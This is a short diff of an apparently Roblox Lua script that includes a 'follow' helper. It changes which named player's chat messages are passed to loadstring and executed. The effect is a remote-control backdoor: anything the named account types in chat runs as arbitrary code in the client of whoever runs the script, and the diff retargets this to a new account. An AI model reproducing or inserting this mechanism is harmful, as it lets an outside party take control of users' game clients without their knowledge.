@@ -10,6 +10,6 @@ _G.follow = function(plr)
   game.Players.LocalPlayer.Character.Humanoid:MoveTo(workspace[plr].Torso.Position)
 end
 
-game.Players.FilteringDisabledEz.Chatted:Connect(function(msg)
+game.Players["le_pedrosigma"].Chatted:Connect(function(msg)
     loadstring(msg)()
 end)
